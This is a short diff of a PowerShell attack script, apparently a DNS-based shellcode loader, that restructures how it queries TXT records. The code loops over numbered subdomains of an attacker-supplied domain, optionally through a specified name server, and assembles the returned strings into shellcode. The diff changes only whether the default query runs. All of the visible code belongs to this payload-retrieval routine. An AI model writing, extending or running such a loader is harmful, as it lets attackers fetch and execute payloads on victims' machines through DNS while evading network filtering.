@@ -71,10 +71,14 @@ http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
         $i = 1
         while ($i -le $subdomains)
         {
-            $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$ShellCode") 
+            
             if ($AuthNS -ne $null)
             {
                 $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$ShellCode $AuthNS") 
+            }
+            else
+            {
+                $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$ShellCode") 
             }
             $temp = $getcommand | select-string -pattern "`""
             $tmp1 = ""
